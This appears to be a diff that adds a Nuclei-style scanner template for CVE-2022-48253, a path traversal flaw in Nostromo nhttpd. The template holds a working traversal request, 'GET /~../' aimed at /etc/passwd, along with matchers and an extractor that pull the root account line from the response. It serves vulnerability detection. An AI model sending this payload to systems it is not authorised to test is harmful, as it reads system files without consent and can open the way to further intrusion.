@@ -1,0 +1,44 @@
+id: CVE-2022-48253
+info:
+  name: Nostromo Path Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Nostromo (aka nhttpd) 2.1 is affected by a path traversal vulnerability, allowing arbitrary file reading and potential command execution if run with sufficient permissions. The vulnerability occurs when using the homedirs option.
+  reference:
+    - https://www.soteritsecurity.com/blog/2023/01/nostromo_from_directory_traversal_to_RCE.html
+    - https://cve.report/CVE-2022-48253/eeeb5eee
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2022-48253
+    cwe-id: CWE-22
+  metadata:
+    vulnerability_type: File Read
+    tags: file-read, path-traversal
+
+variables:
+  filepath: /etc/passwd
+
+http:
+  - raw:
+      - |
+        GET /~../{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?s)root:(x*?):0:0:"
+      - type: regex
+        regex:
+          - "(?s)/bin/bash"
+    extractors:
+      - type: regex
+        group: 0
+        regex:
+          - "(?s)root:(.*?):0:0:(.*?):/bin/bash"
